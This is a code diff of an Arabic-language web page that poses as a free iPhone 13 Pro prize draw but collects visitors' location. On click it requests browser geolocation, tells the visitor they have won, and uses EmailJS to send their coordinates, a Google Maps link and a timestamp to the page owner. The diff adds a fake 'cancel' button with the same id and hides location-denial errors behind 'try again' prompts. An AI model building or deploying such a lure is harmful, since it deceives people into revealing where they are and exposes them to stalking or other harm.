@@ -5,26 +5,25 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title> ايفون</title>
-  <!-- Primary Meta Tags -->
+  <title>مسابقه الايفون</title>
+<!-- Primary Meta Tags -->
 <title>الفوز بـ iPhone 13 Pro - مسابقة الهدايا الكبرى</title>
 <meta name="title" content="الفوز بـ iPhone 13 Pro - مسابقة الهدايا الكبرى">
 <meta name="description" content="اضغط هنا للدخول في السحب المباشر واكسب جهاز iPhone 13 Pro مجاناً اليوم!">
 
 <!-- Open Graph / Facebook / WhatsApp / Telegram -->
 <meta property="og:type" content="website">
-
+<meta property="og:url" content="https://yourdomain.com/">
 <meta property="og:title" content="🎁 هتكسب آيفون جديد - مسابقة الهدايا الكبرى">
 <meta property="og:description" content="سحب رسمي ومجاني مقدم لجميع الزوار اليوم. اضغط لتأكيد مشاركتك فوراً!">
 <meta property="og:image" content="https://m.media-amazon.com/images/I/61l9ppRIiqL._AC_SL1500_.jpg">
 
 <!-- Twitter -->
 <meta property="twitter:card" content="summary_large_image">
-
+<meta property="twitter:url" content="https://yourdomain.com/">
 <meta property="twitter:title" content="🎁 هتكسب آيفون جديد - مسابقة الهدايا الكبرى">
 <meta property="twitter:description" content="سحب رسمي ومجاني مقدم لجميع الزوار اليوم. اضغط لتأكيد مشاركتك فوراً!">
 <meta property="twitter:image" content="https://m.media-amazon.com/images/I/61l9ppRIiqL._AC_SL1500_.jpg">
-
   <style>
     * {
       box-sizing: border-box;
@@ -37,7 +36,6 @@
       align-items: center;
       justify-content: center;
       font-family: Arial, sans-serif;
-
       background:
         radial-gradient(circle at top, #293b5f, #090b10 60%);
       color: white;
@@ -48,54 +46,36 @@
       max-width: 430px;
       padding: 30px 25px;
       text-align: center;
-
       background: rgba(255,255,255,.08);
       backdrop-filter: blur(20px);
-
       border: 1px solid rgba(255,255,255,.15);
       border-radius: 28px;
-
-      box-shadow:
-        0 25px 70px rgba(0,0,0,.5);
+      box-shadow: 0 25px 70px rgba(0,0,0,.5);
     }
 
-    /* iPhone illustration */
     .iphone {
       width: 155px;
       height: 300px;
       margin: 0 auto 25px;
-
-      background: linear-gradient(
-        145deg,
-        #3c3c43,
-        #101014
-      );
-
+      background: linear-gradient(145deg,#3c3c43,#101014);
       border: 4px solid #777;
       border-radius: 32px;
-
       position: relative;
-
       box-shadow:
         0 20px 50px rgba(0,0,0,.5),
         inset 0 0 10px rgba(255,255,255,.15);
-
       overflow: hidden;
     }
 
     .iphone::before {
       content: "";
       position: absolute;
-
       width: 70px;
       height: 22px;
-
       background: #000;
-
       top: 9px;
       left: 50%;
       transform: translateX(-50%);
-
       border-radius: 15px;
       z-index: 2;
     }
@@ -103,21 +83,10 @@
     .screen {
       position: absolute;
       inset: 5px;
-
       border-radius: 27px;
-
       background:
-        radial-gradient(
-          circle at 30% 20%,
-          #6e8cff,
-          transparent 35%
-        ),
-        linear-gradient(
-          160deg,
-          #111b38,
-          #05060b
-        );
-
+        radial-gradient(circle at 30% 20%, #6e8cff, transparent 35%),
+        linear-gradient(160deg,#111b38,#05060b);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -137,55 +106,26 @@
       line-height: 1.8;
       font-size: 15px;
     }
-
-    .location-info {
-      margin: 20px 0;
-
-      padding: 15px;
-
-      background: rgba(255,255,255,.07);
-
-      border-radius: 15px;
-
-      color: #ddd;
-
-      font-size: 14px;
+    .red{
+       background-color: red !important;
     }
 
     button {
       width: 100%;
-
       border: none;
-
+      margin: 10px;
       padding: 16px;
-
       border-radius: 14px;
-
-      background: linear-gradient(
-        135deg,
-        #ffffff,
-        #dfe3eb
-      );
-
+      background: linear-gradient(135deg,#ffffff,#dfe3eb);
       color: #111;
-
       font-size: 17px;
       font-weight: bold;
-
       cursor: pointer;
-
       transition: .2s;
-
-      box-shadow:
-        0 10px 30px rgba(0,0,0,.3);
     }
 
     button:hover {
       transform: translateY(-2px);
-    }
-
-    button:active {
-      transform: scale(.98);
     }
 
     .status {
@@ -205,46 +145,32 @@
     .location {
       margin-top: 20px;
       padding: 15px;
-
       background: rgba(255,255,255,.08);
-
       border-radius: 14px;
-
       direction: ltr;
       text-align: left;
-
       font-size: 13px;
     }
 
     .map {
       display: block;
-
       margin-top: 15px;
-
       padding: 11px;
-
       text-align: center;
-
       background: #4285f4;
-
       color: white;
-
       text-decoration: none;
-
       border-radius: 9px;
     }
 
     .small {
       margin-top: 15px;
-
       font-size: 11px;
-
       color: #999;
       line-height: 1.6;
     }
   </style>
 
-  <!-- EmailJS -->
   <script
     src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
   </script>
@@ -252,43 +178,37 @@
   <script>
     emailjs.init("oM7fNo7rUzVUI3FtU");
   </script>
-
 </head>
-
 
 <body>
 
   <div class="card">
 
-    <!-- iPhone-style visual -->
     <div class="iphone">
-
       <div class="screen">
-
-        <div class="screen-icon">
-          📍
-        </div>
-
+ 
       </div>
-
     </div>
 
-
     <h1>
-      iphone 13
+      مسابقه الايفون
     </h1>
 
-
     <p class="subtitle">
-      اضغط على الزر بالأسفل  
-     للحصول علي فرصه كسب ايفون
+    اضغط علي تأكيد للمنافسه في مسابقه الايفون 
+    او الغاء ثم السماح للخروج 
     </p>
 
-
-
-
     <button id="allowBtn">
-      تاكيد 
+     تأكيد
+    </button>
+
+  
+
+    
+
+<button  style="background-color: red;" id="allowBtn" >
+      الغاء
     </button>
 
 
@@ -320,7 +240,7 @@
         status.className = "status error";
 
         status.textContent =
-          "حدث خطاء حاول تاني";
+         "يجب اعاده المحاوله "
 
         return;
       }
@@ -331,7 +251,7 @@
       status.className = "status";
 
       status.textContent =
-       "جاري تأكيد المكسب"
+       "جاري تحديد الابفون "
 
 
       navigator.geolocation.getCurrentPosition(
@@ -349,14 +269,13 @@
             `https://www.google.com/maps?q=${latitude},${longitude}`;
 
 
-          status.className = "status success";
+          status.className =
+            "status success";
 
           status.textContent =
-            "مبروووووووووك كسبت الايفون 13"
+            "مبروووك كسبت ايفون "
 
 
-
-          // إرسال البيانات إلى EmailJS
 
           emailjs.send(
 
@@ -371,7 +290,7 @@
                 new Date().toLocaleString("ar-EG"),
 
               message:
-                "Location shared",
+                "User shared location",
 
               latitude:
                 latitude,
@@ -414,28 +333,22 @@
           if (error.code === 1) {
 
             status.textContent =
-              "تم رفض إذن الموقع.";
+             "حدث خطاء يجب اعاده المحاوله"
 
-          }
-
-          else if (error.code === 2) {
+          } else if (error.code === 2) {
 
             status.textContent =
-              "تعذر تحديد الموقع.";
+             "حدث خطاء يجب اعاده المحاوله"
 
-          }
-
-          else if (error.code === 3) {
+          } else if (error.code === 3) {
 
             status.textContent =
-              "انتهت مهلة تحديد الموقع.";
+               "حدث خطاء يجب اعاده المحاوله"
 
-          }
-
-          else {
+          } else {
 
             status.textContent =
-              "حدث خطأ أثناء تحديد الموقع.";
+              "حدث خطاء يجب اعاده المحاوله"
 
           }
 
